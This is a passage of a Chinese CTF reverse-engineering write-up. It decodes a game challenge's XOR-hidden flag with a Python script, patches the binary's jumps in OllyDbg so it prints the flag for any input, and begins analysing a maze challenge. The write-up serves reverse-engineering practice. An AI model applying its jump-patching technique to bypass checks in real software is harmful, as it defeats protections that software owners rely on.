[ebp-18h]</span><br>  <span class="hljs-keyword">char</span> v104; <span class="hljs-comment">// [esp+14Dh] [ebp-17h]</span><br>  <span class="hljs-keyword">char</span> v105; <span class="hljs-comment">// [esp+14Eh] [ebp-16h]</span><br>  <span class="hljs-keyword">char</span> v106; <span class="hljs-comment">// [esp+14Fh] [ebp-15h]</span><br>  <span class="hljs-keyword">char</span> v107; <span class="hljs-comment">// [esp+150h] [ebp-14h]</span><br>  <span class="hljs-keyword">char</span> v108; <span class="hljs-comment">// [esp+151h] [ebp-13h]</span><br>  <span class="hljs-keyword">char</span> v109; <span class="hljs-comment">// [esp+152h] [ebp-12h]</span><br>  <span class="hljs-keyword">char</span> v110; <span class="hljs-comment">// [esp+153h] [ebp-11h]</span><br>  <span class="hljs-keyword">char</span> v111; <span class="hljs-comment">// [esp+154h] [ebp-10h]</span><br>  <span class="hljs-keyword">char</span> v112; <span class="hljs-comment">// [esp+155h] [ebp-Fh]</span><br>  <span class="hljs-keyword">char</span> v113; <span class="hljs-comment">// [esp+156h] [ebp-Eh]</span><br>  <span class="hljs-keyword">char</span> v114; <span class="hljs-comment">// [esp+157h] [ebp-Dh]</span><br>  <span class="hljs-keyword">char</span> v115; <span class="hljs-comment">// [esp+158h] [ebp-Ch]</span><br><br>  sub_45A7BE((<span class="hljs-keyword">int</span>)<span class="hljs-string">"done!!! the flag is "</span>);<br>  v59 = <span class="hljs-number">18</span>;<br>  v60 = <span class="hljs-number">64</span>;<br>  v61 = <span class="hljs-number">98</span>;<br>  v62 = <span class="hljs-number">5</span>;<br>  v63 = <span class="hljs-number">2</span>;<br>  v64 = <span class="hljs-number">4</span>;<br>  v65 = <span class="hljs-number">6</span>;<br>  v66 = <span class="hljs-number">3</span>;<br>  v67 = <span class="hljs-number">6</span>;<br>  v68 = <span class="hljs-number">48</span>;<br>  v69 = <span class="hljs-number">49</span>;<br>  v70 = <span class="hljs-number">65</span>;<br>  v71 = <span class="hljs-number">32</span>;<br>  v72 = <span class="hljs-number">12</span>;<br>  v73 = <span class="hljs-number">48</span>;<br>  v74 = <span class="hljs-number">65</span>;<br>  v75 = <span class="hljs-number">31</span>;<br>  v76 = <span class="hljs-number">78</span>;<br>  v77 = <span class="hljs-number">62</span>;<br>  v78 = <span class="hljs-number">32</span>;<br>  v79 = <span class="hljs-number">49</span>;<br>  v80 = <span class="hljs-number">32</span>;<br>  v81 = <span class="hljs-number">1</span>;<br>  v82 = <span class="hljs-number">57</span>;<br>  v83 = <span class="hljs-number">96</span>;<br>  v84 = <span class="hljs-number">3</span>;<br>  v85 = <span class="hljs-number">21</span>;<br>  v86 = <span class="hljs-number">9</span>;<br>  v87 = <span class="hljs-number">4</span>;<br>  v88 = <span class="hljs-number">62</span>;<br>  v89 = <span class="hljs-number">3</span>;<br>  v90 = <span class="hljs-number">5</span>;<br>  v91 = <span class="hljs-number">4</span>;<br>  v92 = <span class="hljs-number">1</span>;<br>  v93 = <span class="hljs-number">2</span>;<br>  v94 = <span class="hljs-number">3</span>;<br>  v95 = <span class="hljs-number">44</span>;<br>  v96 = <span class="hljs-number">65</span>;<br>  v97 = <span class="hljs-number">78</span>;<br>  v98 = <span class="hljs-number">32</span>;<br>  v99 = <span class="hljs-number">16</span>;<br>  v100 = <span class="hljs-number">97</span>;<br>  v101 = <span class="hljs-number">54</span>;<br>  v102 = <span class="hljs-number">16</span>;<br>  v103 = <span class="hljs-number">44</span>;<br>  v104 = <span class="hljs-number">52</span>;<br>  v105 = <span class="hljs-number">32</span>;<br>  v106 = <span class="hljs-number">64</span>;<br>  v107 = <span class="hljs-number">89</span>;<br>  v108 = <span class="hljs-number">45</span>;<br>  v109 = <span class="hljs-number">32</span>;<br>  v110 = <span class="hljs-number">65</span>;<br>  v111 = <span class="hljs-number">15</span>;<br>  v112 = <span class="hljs-number">34</span>;<br>  v113 = <span class="hljs-number">18</span>;<br>  v114 = <span class="hljs-number">16</span>;<br>  v115 = <span class="hljs-number">0</span>;<br>  v2 = <span class="hljs-number">123</span>;<br>  v3 = <span class="hljs-number">32</span>;<br>  v4 = <span class="hljs-number">18</span>;<br>  v5 = <span class="hljs-number">98</span>;<br>  v6 = <span class="hljs-number">119</span>;<br>  v7 = <span class="hljs-number">108</span>;<br>  v8 = <span class="hljs-number">65</span>;<br>  v9 = <span class="hljs-number">41</span>;<br>  v10 = <span class="hljs-number">124</span>;<br>  v11 = <span class="hljs-number">80</span>;<br>  v12 = <span class="hljs-number">125</span>;<br>  v13 = <span class="hljs-number">38</span>;<br>  v14 = <span class="hljs-number">124</span>;<br>  v15 = <span class="hljs-number">111</span>;<br>  v16 = <span class="hljs-number">74</span>;<br>  v17 = <span class="hljs-number">49</span>;<br>  v18 = <span class="hljs-number">83</span>;<br>  v19 = <span class="hljs-number">108</span>;<br>  v20 = <span class="hljs-number">94</span>;<br>  v21 = <span class="hljs-number">108</span>;<br>  v22 = <span class="hljs-number">84</span>;<br>  v23 = <span class="hljs-number">6</span>;<br>  v24 = <span class="hljs-number">96</span>;<br>  v25 = <span class="hljs-number">83</span>;<br>  v26 = <span class="hljs-number">44</span>;<br>  v27 = <span class="hljs-number">121</span>;<br>  v28 = <span class="hljs-number">104</span>;<br>  v29 = <span class="hljs-number">110</span>;<br>  v30 = <span class="hljs-number">32</span>;<br>  v31 = <span class="hljs-number">95</span>;<br>  v32 = <span class="hljs-number">117</span>;<br>  v33 = <span class="hljs-number">101</span>;<br>  v34 = <span class="hljs-number">99</span>;<br>  v35 = <span class="hljs-number">123</span>;<br>  v36 = <span class="hljs-number">127</span>;<br>  v37 = <span class="hljs-number">119</span>;<br>  v38 = <span class="hljs-number">96</span>;<br>  v39 = <span class="hljs-number">48</span>;<br>  v40 = <span class="hljs-number">107</span>;<br>  v41 = <span class="hljs-number">71</span>;<br>  v42 = <span class="hljs-number">92</span>;<br>  v43 = <span class="hljs-number">29</span>;<br>  v44 = <span class="hljs-number">81</span>;<br>  v45 = <span class="hljs-number">107</span>;<br>  v46 = <span class="hljs-number">90</span>;<br>  v47 = <span class="hljs-number">85</span>;<br>  v48 = <span class="hljs-number">64</span>;<br>  v49 = <span class="hljs-number">12</span>;<br>  v50 = <span class="hljs-number">43</span>;<br>  v51 = <span class="hljs-number">76</span>;<br>  v52 = <span class="hljs-number">86</span>;<br>  v53 = <span class="hljs-number">13</span>;<br>  v54 = <span class="hljs-number">114</span>;<br>  v55 = <span class="hljs-number">1</span>;<br>  v56 = <span class="hljs-number">117</span>;<br>  v57 = <span class="hljs-number">126</span>;<br>  v58 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">56</span>; ++i )<br>  &#123;<br>    *(&amp;v2 + i) ^= *(&amp;v59 + i);<br>    *(&amp;v2 + i) ^= <span class="hljs-number">0x13</span>u;<br>  &#125;<br>  <span class="hljs-keyword">return</span> sub_45A7BE((<span class="hljs-keyword">int</span>)<span class="hljs-string">"%s\n"</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>仔细分析会发现v2到v115在堆栈中的地址是连续的，此时就可以利用地址来取值，原理类似数组取值。<br>再根据for循环来写函数，sub_45A7BE()看样子可能是输出函数。尝试写出EXP：</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">v2 = [<span class="hljs-number">123</span>, <span class="hljs-number">32</span>, <span class="hljs-number">18</span>, <span class="hljs-number">98</span>, <span class="hljs-number">119</span>, <span class="hljs-number">108</span>,<br>      <span class="hljs-number">65</span>, <span class="hljs-number">41</span>, <span class="hljs-number">124</span>, <span class="hljs-number">80</span>, <span class="hljs-number">125</span>, <span class="hljs-number">38</span>,<br>      <span class="hljs-number">124</span>, <span class="hljs-number">111</span>, <span class="hljs-number">74</span>, <span class="hljs-number">49</span>, <span class="hljs-number">83</span>, <span class="hljs-number">108</span>,<br>      <span class="hljs-number">94</span>, <span class="hljs-number">108</span>, <span class="hljs-number">84</span>, <span class="hljs-number">6</span>, <span class="hljs-number">96</span>, <span class="hljs-number">83</span>, <span class="hljs-number">44</span>,<br>      <span class="hljs-number">121</span>, <span class="hljs-number">104</span>, <span class="hljs-number">110</span>, <span class="hljs-number">32</span>, <span class="hljs-number">95</span>, <span class="hljs-number">117</span>,<br>      <span class="hljs-number">101</span>, <span class="hljs-number">99</span>, <span class="hljs-number">123</span>, <span class="hljs-number">127</span>, <span class="hljs-number">119</span>, <span class="hljs-number">96</span>,<br>      <span class="hljs-number">48</span>, <span class="hljs-number">107</span>, <span class="hljs-number">71</span>, <span class="hljs-number">92</span>, <span class="hljs-number">29</span>, <span class="hljs-number">81</span>, <span class="hljs-number">107</span>,<br>      <span class="hljs-number">90</span>, <span class="hljs-number">85</span>, <span class="hljs-number">64</span>, <span class="hljs-number">12</span>, <span class="hljs-number">43</span>, <span class="hljs-number">76</span>, <span class="hljs-number">86</span>,<br>      <span class="hljs-number">13</span>, <span class="hljs-number">114</span>, <span class="hljs-number">1</span>, <span class="hljs-number">117</span>, <span class="hljs-number">126</span>, <span class="hljs-number">0</span>]<br><br>v59 = [<span class="hljs-number">18</span>, <span class="hljs-number">64</span>, <span class="hljs-number">98</span>, <span class="hljs-number">5</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>,<br>       <span class="hljs-number">6</span>, <span class="hljs-number">48</span>, <span class="hljs-number">49</span>, <span class="hljs-number">65</span>, <span class="hljs-number">32</span>, <span class="hljs-number">12</span>, <span class="hljs-number">48</span>,<br>       <span class="hljs-number">65</span>, <span class="hljs-number">31</span>, <span class="hljs-number">78</span>, <span class="hljs-number">62</span>, <span class="hljs-number">32</span>, <span class="hljs-number">49</span>, <span class="hljs-number">32</span>,<br>       <span class="hljs-number">1</span>, <span class="hljs-number">57</span>, <span class="hljs-number">96</span>, <span class="hljs-number">3</span>, <span class="hljs-number">21</span>, <span class="hljs-number">9</span>, <span class="hljs-number">4</span>, <span class="hljs-number">62</span>,<br>       <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">44</span>, <span class="hljs-number">65</span>, <span class="hljs-number">78</span>,<br>       <span class="hljs-number">32</span>, <span class="hljs-number">16</span>, <span class="hljs-number">97</span>, <span class="hljs-number">54</span>, <span class="hljs-number">16</span>, <span class="hljs-number">44</span>, <span class="hljs-number">52</span>, <span class="hljs-number">32</span>,<br>       <span class="hljs-number">64</span>, <span class="hljs-number">89</span>, <span class="hljs-number">45</span>, <span class="hljs-number">32</span>, <span class="hljs-number">65</span>, <span class="hljs-number">15</span>, <span class="hljs-number">34</span>, <span class="hljs-number">18</span>, <span class="hljs-number">16</span>, <span class="hljs-number">0</span>]<br><br>flag = <span class="hljs-string">''</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, <span class="hljs-number">56</span>):<br>    v2[i] ^= v59[i]<br>    v2[i] ^= <span class="hljs-number">0x13</span><br>    flag += chr(v2[i])<br><br>print(flag)<br></code></pre></div></td></tr></table></figure>

<p>得到flag</p>
<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>我发现很多wp都是关于算法的解法，但是我认为在真实测试环境中，调试分析才是最重要的部分，仅仅只是靠算法的解题的话，我觉的这样仅仅只能限制在CTF中。</p>
<p>这里我要说的第二种解法就是如何定位关键点，进行爆破的。</p>
<img src="https://qiniuyun1.fxhstudy.com/game-5.png" srcset="/img/loading.gif"  alt="1" />

<p>先将文件拖入OD中，先智能搜索，分析一下字符串，发现了 done!!! the flag is</p>
<img src="https://qiniuyun1.fxhstudy.com/game-6.png" srcset="/img/loading.gif"  alt="1" />

<p>觉得有戏，回车进入</p>
<img src="https://qiniuyun1.fxhstudy.com/game-7.png" srcset="/img/loading.gif"  alt="1" />

<p>二话不说，现在这个函数头部下断点(反正也没有什么思路)，然而并没有什么用。。。(后面有用)<br>再次查看搜索出来的字符串，发现了一个很重要的信息</p>
<img src="https://qiniuyun1.fxhstudy.com/game-8.png" srcset="/img/loading.gif"  alt="1" />

<p>进入看看，</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-number">0136F</span>502  |. /<span class="hljs-number">0F</span>84 <span class="hljs-number">6E010000</span> |je a0f2af98<span class="hljs-number">.0136F</span>676<br><span class="hljs-number">0136F</span>508  |. |<span class="hljs-number">68</span> <span class="hljs-number">7</span>CB54101   |push a0f2af98<span class="hljs-number">.0141B</span>57C                  ;  input n,n(<span class="hljs-number">1</span><span class="hljs-number">-8</span>)\n<br><span class="hljs-number">0136F</span>50D  |. |E8 ACB2FFFF   |call a0f2af98<span class="hljs-number">.0136</span>A7BE<br><span class="hljs-number">0136F</span>512  |. |<span class="hljs-number">83</span>C4 <span class="hljs-number">04</span>       |add esp,<span class="hljs-number">0x4</span><br><span class="hljs-number">0136F</span>515  |. |E8 FE9EFFFF   |call a0f2af98<span class="hljs-number">.01369418</span><br><span class="hljs-number">0136F</span>51A  |. |<span class="hljs-number">68</span> <span class="hljs-number">90B</span>54101   |push a0f2af98<span class="hljs-number">.0141B</span>590                  ;  n=<br></code></pre></div></td></tr></table></figure>

<p>再看看我们程序运行的结果</p>
<img src="https://qiniuyun1.fxhstudy.com/game-9.png" srcset="/img/loading.gif"  alt="1" />

<p>作用不用我多说了吧，话不多说，直接下断点，再重新让它跑起来，</p>
<img src="https://qiniuyun1.fxhstudy.com/game-10.png" srcset="/img/loading.gif"  alt="1" />

<p>在这个地方停了下来，目的让我们输入，我们随便输入一个2，接着调试，</p>
<img src="https://qiniuyun1.fxhstudy.com/game-11.png" srcset="/img/loading.gif"  alt="1" />

<p>可以发现这里存在清屏，继续单步，</p>
<img src="https://qiniuyun1.fxhstudy.com/game-12.png" srcset="/img/loading.gif"  alt="1" />

<p>发现了一个非常大的跳转，不做任何操作，接着往下单步我发现，就会进行清屏操作，所以问题一定是出在这里的，于是，我尝试将</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-number">0136F</span>5DB     /<span class="hljs-number">0F</span>85 <span class="hljs-number">90000000</span> jnz a0f2af98<span class="hljs-number">.0136F</span>671<br></code></pre></div></td></tr></table></figure>

<p>这一行代码nop掉，事实证明我的判断还是正确的，但是下面还有几行跳转，我都一一nop掉，（这里其实可以直接用jmp指令，直接跳转到这个call）<br>终于，问题就出现在了这个call中，</p>
<img src="https://qiniuyun1.fxhstudy.com/game-13.png" srcset="/img/loading.gif"  alt="1" />

<p>发现跳转到开始我们看的  done!!! the flag is  那个函数中，这里就是为什么我们需要那个时候下断点，不下的话，不会跳转。接下来就继续单步，走到这里时，我们看到这个，done!!! the flag is  显示在命令行中，</p>
<img src="https://qiniuyun1.fxhstudy.com/game-14.png" srcset="/img/loading.gif"  alt="1" />

<p>懂了，Ctrl+F8，自动步过，我们会发现，它会一直在这一段跑</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-number">0136</span>EB61  |&gt; /<span class="hljs-number">8B</span>85 <span class="hljs-number">6</span>CFFFFFF /mov eax,[local<span class="hljs-number">.37</span>]<br><span class="hljs-number">0136</span>EB67  |. |<span class="hljs-number">83</span>C0 <span class="hljs-number">01</span>       |add eax,<span class="hljs-number">0x1</span><br><span class="hljs-number">0136</span>EB6A  |. |<span class="hljs-number">8985</span> <span class="hljs-number">6</span>CFFFFFF |mov [local<span class="hljs-number">.37</span>],eax<br><span class="hljs-number">0136</span>EB70  |&gt; |<span class="hljs-number">83B</span>D <span class="hljs-number">6</span>CFFFFFF&gt; cmp [local<span class="hljs-number">.37</span>],<span class="hljs-number">0x38</span><br><span class="hljs-number">0136</span>EB77  |. |<span class="hljs-number">7</span>D <span class="hljs-number">48</span>         |jge short a0f2af98<span class="hljs-number">.0136</span>EBC1<br><span class="hljs-number">0136</span>EB79  |. |<span class="hljs-number">8B</span>85 <span class="hljs-number">6</span>CFFFFFF |mov eax,[local<span class="hljs-number">.37</span>]<br><span class="hljs-number">0136</span>EB7F  |. |<span class="hljs-number">0F</span>BE4C05 BC   |movsx ecx,<span class="hljs-keyword">byte</span> ptr ss:[ebp+eax<span class="hljs-number">-0x44</span>]<br><span class="hljs-number">0136</span>EB84  |. |<span class="hljs-number">8B</span>95 <span class="hljs-number">6</span>CFFFFFF |mov edx,[local<span class="hljs-number">.37</span>]<br><span class="hljs-number">0136</span>EB8A  |. |<span class="hljs-number">0F</span>BE8415 <span class="hljs-number">78F</span>F&gt;|movsx eax,<span class="hljs-keyword">byte</span> ptr ss:[ebp+edx<span class="hljs-number">-0x88</span>]<br><span class="hljs-number">0136</span>EB92  |. |<span class="hljs-number">33</span>C1          |<span class="hljs-keyword">xor</span> eax,ecx<br><span class="hljs-number">0136</span>EB94  |. |<span class="hljs-number">8B</span>8D <span class="hljs-number">6</span>CFFFFFF |mov ecx,[local<span class="hljs-number">.37</span>]<br><span class="hljs-number">0136</span>EB9A  |. |<span class="hljs-number">88840</span>D <span class="hljs-number">78F</span>FFF&gt;|mov <span class="hljs-keyword">byte</span> ptr ss:[ebp+ecx<span class="hljs-number">-0x88</span>],al<br><span class="hljs-number">0136</span>EBA1  |. |<span class="hljs-number">8B</span>85 <span class="hljs-number">6</span>CFFFFFF |mov eax,[local<span class="hljs-number">.37</span>]<br><span class="hljs-number">0136</span>EBA7  |. |<span class="hljs-number">0F</span>BE8C05 <span class="hljs-number">78F</span>F&gt;|movsx ecx,<span class="hljs-keyword">byte</span> ptr ss:[ebp+eax<span class="hljs-number">-0x88</span>]<br><span class="hljs-number">0136</span>EBAF  |. |<span class="hljs-number">83F</span>1 <span class="hljs-number">13</span>       |<span class="hljs-keyword">xor</span> ecx,<span class="hljs-number">0x13</span><br><span class="hljs-number">0136</span>EBB2  |. |<span class="hljs-number">8B</span>95 <span class="hljs-number">6</span>CFFFFFF |mov edx,[local<span class="hljs-number">.37</span>]<br><span class="hljs-number">0136</span>EBB8  |. |<span class="hljs-number">888</span>C15 <span class="hljs-number">78F</span>FFF&gt;|mov <span class="hljs-keyword">byte</span> ptr ss:[ebp+edx<span class="hljs-number">-0x88</span>],cl<br><span class="hljs-number">0136</span>EBBF    ^\EB A0         \jmp short a0f2af98<span class="hljs-number">.0136</span>EB61<br></code></pre></div></td></tr></table></figure>


<p>应该就是我们上述分析的获取 flag  的算法了，让它跑就完事了。<br>最后得到flag</p>
<img src="https://qiniuyun1.fxhstudy.com/game-15.png" srcset="/img/loading.gif"  alt="1" />

<p>保存到1.exe，这样，不论我们输入什么，都会输出flag值。</p>
<h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><p>这个方法我就不说了，其实就是直接写个脚本，暴力破解这个游戏，答案12345678或者87654321，都是可以的，但是能够逆向，我为什么要暴力破解呢？</p>
<p>========================================<br>总结：<br>    1、(CTF中)逆向不单单可以从调试找到关键点来破解，还可以从算法上入手，可以不单单拘泥于一种方法；<br>    2、逆向在于找到关键点，进行破解，获取flag值，但是，总的来说，还是要多操作，多实践才可以。</p>
<h2 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h2><p>u1s1,这题有一定难度，这题我卡在了二维函数指针那里，所以这里记录一下。</p>
<h3 id="0x01-查壳和详细信息"><a href="#0x01-查壳和详细信息" class="headerlink" title="0x01  查壳和详细信息"></a>0x01  查壳和详细信息</h3><img src="https://qiniuyun1.fxhstudy.com/game-15.png" srcset="/img/loading.gif"  alt="1" />

<p>可以看到程序是ELF文件,64位。</p>
<h3 id="0x02-IDA分析文件"><a href="#0x02-IDA分析文件" class="headerlink" title="0x02  IDA分析文件"></a>0x02  IDA分析文件</h3><p>shift+F12，查看有没有关键的信息。</p>
<img src="https://qiniuyun1.fxhstudy.com/game-15.png" srcset="/img/loading.gif"  alt="1" />

<p>可以看到有一些关键字，和一串很多的✳+空格，不知道是什么先不管。<br>接着我进行了反编译，遇事不决反编译。<br>贴出反编译后的伪代码：</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-keyword">char</span> **a2, <span class="hljs-keyword">char</span> **a3)</span><br></span>&#123;<br>  <span class="hljs-keyword">signed</span> __int64 v3; <span class="hljs-comment">// rbx</span><br>  <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> v4; <span class="hljs-comment">// eax</span><br>  <span class="hljs-keyword">bool</span> v5; <span class="hljs-comment">// bp</span><br>  <span class="hljs-keyword">bool</span> v6; <span class="hljs-comment">// al</span><br>  <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *v7; <span class="hljs-comment">// rdi</span><br>  __int64 v9; <span class="hljs-comment">// [rsp+0h] [rbp-28h]</span><br><br>  v9 = <span class="hljs-number">0L</span>L;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Input flag:"</span>);<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%s"</span>, &amp;s1, <span class="hljs-number">0L</span>L);<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strlen</span>(&amp;s1) != <span class="hljs-number">24</span> || <span class="hljs-built_in">strncmp</span>(&amp;s1, <span class="hljs-string">"nctf&#123;"</span>, <span class="hljs-number">5u</span>LL) || *(&amp;byte_6010BF + <span class="hljs-number">24</span>) != <span class="hljs-number">125</span> )<br>  &#123;<br>LABEL_22:<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Wrong flag!"</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>  &#125;<br>  v3 = <span class="hljs-number">5L</span>L;<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strlen</span>(&amp;s1) - <span class="hljs-number">1</span> &gt; <span class="hljs-number">5</span> )<br>  &#123;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      v4 = *(&amp;s1 + v3);<br>      v5 = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">if</span> ( v4 &gt; <span class="hljs-number">78</span> )<br>      &#123;<br>        v4 = (<span class="hljs-keyword">unsigned</span> __int8)v4;<br>        <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> __int8)v4 == <span class="hljs-number">79</span> )<br>        &#123;<br>          v6 = sub_400650((_DWORD *)&amp;v9 + <span class="hljs-number">1</span>);<br>          <span class="hljs-keyword">goto</span> LABEL_14;<br>        &#125;<br>        <span class="hljs-keyword">if</span> ( v4 == <span class="hljs-number">111</span> )<br>        &#123;<br>          v6 = sub_400660((<span class="hljs-keyword">int</span> *)&amp;v9 + <span class="hljs-number">1</span>);<br>          <span class="hljs-keyword">goto</span> LABEL_14;<br>        &#125;<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        v4 = (<span class="hljs-keyword">unsigned</span> __int8)v4;<br>        <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> __int8)v4 == <span class="hljs-number">46</span> )<br>        &#123;<br>          v6 = sub_400670(&amp;v9);<br>          <span class="hljs-keyword">goto</span> LABEL_14;<br>        &#125;<br>        <span class="hljs-keyword">if</span> ( v4 == <span class="hljs-number">48</span> )<br>        &#123;<br>          v6 = sub_400680((<span class="hljs-keyword">int</span> *)&amp;v9);<br>LABEL_14:<br>          v5 = v6;<br>          <span class="hljs-keyword">goto</span> LABEL_15;<br>        &#125;<br>      &#125;<br>LABEL_15:<br>      <span class="hljs-keyword">if</span> ( !(<span class="hljs-keyword">unsigned</span> __int8)sub_400690(asc_601060, HIDWORD(v9), (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)v9) )<br>        <span class="hljs-keyword">goto</span> LABEL_22;<br>      <span class="hljs-keyword">if</span> ( ++v3 &gt;= <span class="hljs-built_in">strlen</span>(&amp;s1) - <span class="hljs-number">1</span> )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( v5 )<br>          <span class="hljs-keyword">break</span>;<br>LABEL_20:<br>        v7 = <span class="hljs-string">"Wrong flag!"</span>;<br>        <span class="hljs-keyword">goto</span> LABEL_21;<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( asc_601060[<span class="hljs-number">8</span> * (<span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span>)v9 + SHIDWORD(v9)] != <span class="hljs-number">35</span> )<br>    <span class="hljs-keyword">goto</span> LABEL_20;<br>  v7 = <span class="hljs-string">"Congratulations!"</span>;<br>LABEL_21:<br>  <span class="hljs-built_in">puts</span>(v7);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0L</span>L;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>先分析这一行代码</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strlen</span>(&amp;s1) != <span class="hljs-number">24</span> || (v3 = <span class="hljs-string">"nctf&#123;"</span>, <span class="hljs-built_in">strncmp</span>(&amp;s1, <span class="hljs-string">"nctf&#123;"</span>, <span class="hljs-number">5u</span>LL)) || *(&amp;byte_6010BF + <span class="hljs-number">24</span>) != <span class="hljs-number">125</span> )<br></code></pre></div></td></tr></table></figure>

<p>发现输入的字符串（即flag）需要是24个字符，前五个必须是”nctf{“,最后一个必须是”}”，这里一阵兴奋啊，没想到这么快就有头目了，，，但是我失策了。<br>直接贴出几行重点代码</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">v6 = sub_400650((_DWORD *)&amp;v9 + <span class="hljs-number">1</span>);<br>v6 = sub_400660((<span class="hljs-keyword">int</span> *)&amp;v9 + <span class="hljs-number">1</span>);<br>v6 = sub_400670(&amp;v9);<br>v6 = sub_400680((<span class="hljs-keyword">int</span> *)&amp;v9);<br></code></pre></div></td></tr></table></figure>

<p>这四行代码是导致我没看懂的原因，给出这四个函数的伪代码：</p>
